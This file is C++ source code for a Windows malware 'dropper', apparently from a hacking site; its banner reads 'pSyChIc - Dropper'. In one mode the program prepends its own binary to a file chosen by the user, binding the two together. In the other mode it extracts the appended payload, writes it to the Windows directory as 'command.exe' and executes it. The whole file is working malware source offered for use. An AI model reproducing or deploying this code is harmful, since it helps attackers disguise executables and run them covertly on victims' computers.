#include <iostream.h>
#include <fstream.h>
#include <windows.h>
#include <string.h>

void write(int mysize,char *tpath,char *mybuf)
{
	int tsize = 0;
	ifstream tfile(tpath,ios::binary);
	tfile.seekg (0,ios::end);
	tsize = tfile.tellg();
	tfile.seekg (0,ios::beg);
	char *tbuf = new char [tsize];
	tfile.read(tbuf,tsize);
	tfile.close();
	ofstream outputfile(tpath,ios::binary);
	outputfile.write(mybuf,mysize);
	outputfile.write(tbuf,tsize);
	outputfile.close();
	cout<<tpath<<endl;
};    

void extract(int mysize,char *target)
{
	char windir[250];
	GetWindowsDirectory(windir,MAX_PATH);
	ifstream tfile(target,ios::binary);
	tfile.seekg (213045);
	int theamount = mysize - 213045;
	char *tbuf = new char [theamount];
	tfile.read(tbuf,theamount);
	tfile.close();
	char mypath[100];
	strcpy (mypath,windir);
	strcat (mypath,"\\command.exe");
	ofstream outfile(mypath,ios::binary);
	outfile.write(tbuf,theamount);
	outfile.close();
	cout<<mypath;
	system(mypath);
};    

int checkit(int mysize,char *mybuf,char *target)
{
	int checker = 0;
	char tpath[512];
	
	if (mysize != 213045)
	{
		extract(mysize,target);
	}    
	else
	{
		cout<<"pSyChIc - <span class="searchlite">Dropper</span>"<<endl;
		cout<<"Input file path"<<endl;
		cin>>tpath;
		write (mysize,tpath,mybuf);
	}
	return 0;
};    

int main(int argc, char *argv[])
{
	long mysize;
	char *target = argv[0];
	
	ifstream myfile(argv[0] ,ios::binary);
	
		myfile.seekg (0,ios::end);
		mysize = myfile.tellg();
		myfile.seekg (0,ios::beg);
	
	char *mybuf = new char [mysize];
	
		myfile.read(mybuf,mysize);
		myfile.close();
		
	checkit (mysize,mybuf,target);
	return 0;
}